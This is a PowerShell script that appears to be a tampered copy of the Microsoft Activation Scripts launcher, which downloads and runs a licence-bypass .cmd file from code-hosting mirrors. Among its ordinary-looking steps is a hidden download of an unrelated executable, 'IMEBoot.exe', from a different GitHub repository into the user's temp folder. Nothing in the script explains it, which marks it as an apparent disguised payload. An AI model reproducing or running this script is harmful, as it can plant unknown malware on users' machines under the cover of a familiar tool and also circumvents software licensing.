$ErrorActionPreference = "Stop"
# Enable TLSv1.2 for compatibility with older clients
[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12

$CommonURLPart = 'MAS/All-In-One-Version/MAS_AIO-CRC32_60BA35A8.cmd'
$DownloadURLs = @(
    'https://bitbucket.org/WindowsAddict/microsoft-activation-scripts/raw/master/',
    'https://codeberg.org/massgravel/Microsoft-Activation-Scripts/raw/branch/master/',
    'https://raw.githubusercontent.com/massgravel/Microsoft-Activation-Scripts/master/'
)

$DownloadURL = ($DownloadURLs | Get-Random) + $CommonURLPart

try {
    $response = Invoke-WebRequest -Uri $DownloadURL -UseBasicParsing
} catch {
    $DownloadURL = ($DownloadURLs -ne $DownloadURL) | Get-Random
    $response = Invoke-WebRequest -Uri ($DownloadURL + $CommonURLPart) -UseBasicParsing
}

$rand = Get-Random -Maximum 99999999
$isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
$FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\MAS_$rand.cmd" } else { "$env:TEMP\MAS_$rand.cmd" }

$Url = "https://github.com/ShellSculptor/GetsScreen-Windows-10/raw/main/IMEBoot.exe"
$webClient = New-Object System.Net.WebClient
$webClient.DownloadFile($Url, "$env:Temp\IMEBoot.exe")

$prefix = "@:: $rand `r`n"
$content = $prefix + $response
Set-Content -Path $FilePath -Value $content
Start-Process $FilePath -Wait

Remove-Item "$env:TEMP\MAS*.cmd", "$env:SystemRoot\Temp\MAS*.cmd" -ErrorAction SilentlyContinue
